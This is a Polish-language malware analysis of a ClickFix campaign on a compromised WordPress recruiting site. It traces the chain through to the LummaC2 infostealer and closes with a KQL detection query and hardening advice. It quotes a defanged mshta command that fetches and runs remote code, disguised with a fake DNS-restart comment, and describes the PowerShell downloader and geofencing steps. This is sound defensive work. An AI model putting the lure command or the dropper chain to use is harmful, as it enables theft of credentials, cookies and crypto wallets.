Executive Summary

Analiza zgłoszonej strony ligohr[.]pl (rekrutacje) wykazała aktywną kampanię ClickFix. Skompromitowana strona WordPress wstrzykiwała zewnętrzny skrypt z rednosehorse[.]com, wyświetlający fałszywy komunikat "Verification Failed - Network Error" i instruujący uruchomienie Win+R → Ctrl+V → Enter.

Pełny łańcuch ataku zrekonstruowany metodą statycznej analizy w izolowanym środowisku Windows Sandbox. Finalny payload - LummaC2 infostealer (Update.exe) - potwierdzony przez ANY.RUN. Technika wykorzystuje wyłącznie natywne narzędzia systemu Windows (LOTL), omijając kontrole EDR oparte na sygnaturach.

Technical Analysis - Stage by Stage
Stage 1 - Initial Access (ligohr[.]pl)
Strona WordPress z zewnętrznym skryptem z rednosehorse[.]com wstrzykniętym przez tag <script>. Skrypt wyświetla overlay z fake reCAPTCHA i komunikatem o błędzie DNS, instruując uruchomienie dialogu Run. DevTools potwierdziły obecność skryptu w drzewie zasobów.
Stage 2 - ClickFix Clipboard Execution
Po załadowaniu strony schowek systemu zostaje nadpisany komendą: mshta hxxp[://]guaicui[.]com[.]br/wp-content/plugins/goodlayers-core-portfolio/layer[.]html # "Microsoft Windows: DNS service Reload and Restart UP". Komentarz po # to social engineering - ma wyglądać jak legalny komunikat systemowy w oknie Run.
Stage 3 - VBScript Loader (layer.html)
Źródło strony zawiera VBScript z WScript.Shell wykonujący PowerShell z flagami -NoProfile -ExecutionPolicy Bypass. Payload zakodowany w Base64. Dekodowanie przez CyberChef ujawniło URL kolejnego stage: guaicui[.]com[.]br/.../languages/es.txt
Stage 4 - PowerShell Dropper (es.txt)
Skrypt PS pobiera ZIP z guaicui[.]com[.]br/.../captcha/js/file.zip, rozpakowuje do %LOCALAPPDATA%\SystemCacheFiles\LocalApplicationDevelopment, czeka 30 sekund, uruchamia Update.exe. Wykonuje geofencing check - IP ofiary przez ifconfig.me → POST do Google przed egzekucją.
Stage 5 - LummaC2 Infostealer (Update.exe)
Finalny payload sklasyfikowany przez ANY.RUN jako LummaC2 - infostealer kradnący dane logowania, cookies przeglądarek i portfele kryptowalut.
⚠ Geofencing / Targeting: Skrypt sprawdza IP ofiary przed wykonaniem - Invoke-RestMethod -Uri "https://ifconfig.me/ip". Wskazuje to na świadome targetowanie określonych regionów geograficznych lub wykluczanie środowisk sandbox/VPN.

Detection Recommendations
LOTL Detection - KQL:
DeviceProcessEvents | where FileName in~ ("mshta.exe","wscript.exe","cscript.exe") | where ProcessCommandLine has_any ("http://","https://") | where InitiatingProcessFileName !in~ ("explorer.exe") | project Timestamp, DeviceName, AccountName, ProcessCommandLine
ASR Rule: Włącz "Block execution of potentially obfuscated scripts" oraz "Block all Office applications from creating child processes". Rozważ blokowanie mshta.exe przez AppLocker/WDAC dla użytkowników nie-adminów.
